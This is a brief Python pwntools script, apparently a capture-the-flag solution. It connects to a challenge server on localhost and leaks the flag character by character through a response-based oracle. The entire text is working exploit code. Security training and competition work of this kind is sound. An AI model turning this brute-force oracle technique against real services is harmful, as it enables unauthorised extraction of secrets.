from time import sleep

from pwn import *

# p = process(["./server.py"])
p = remote("localhost", 40979)

index = 0
flag = ""
p.recvuntil(b">")
while True:
    for letter_check in range(32, 127):
        p.sendline(b"...==...")
        p.sendline(b"--".join([b"a"] * letter_check))
        p.sendline(b"b" * (index + 1) + b"-a")
        p.sendline(b"b/a")
        sleep(0.1) # need to adjust when trying aganist remote
        q = p.recv()
        if b"break" in q:
            index += 1
            flag += chr(letter_check)
            print(flag)
            if flag.endswith("}"):
                print(flag)
                exit(0)
            break
        p.sendline(b".")
        sleep(0.01)
        p.recv()